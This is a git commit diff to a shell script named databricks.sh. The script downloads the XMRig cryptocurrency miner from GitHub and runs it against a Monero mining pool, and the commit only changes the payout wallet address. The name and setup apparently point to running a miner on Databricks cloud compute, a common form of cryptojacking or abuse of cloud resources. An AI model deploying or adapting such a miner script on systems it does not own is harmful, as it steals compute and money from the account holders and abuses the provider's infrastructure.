96837bd78272dd9f3e6b8466c868c0c5c82f4e26
thewarrior2 <newm2007@gmail.com>
2022-03-19 08:54:10 +0200

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
 tar xvzf xmrig-6.16.4-focal-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id aank
+./xmrig -o us-west.minexmr.com:443 -u 87RXucprYBtWw3PAGiMzqgjKpVoPChy1yhk1MTQo5Pv5ZcRXfrV9Yz6H8WCwByjjxGenhP6NVcv94iwWeTQg947FSaGyE6b  -k --tls --rig-id aank
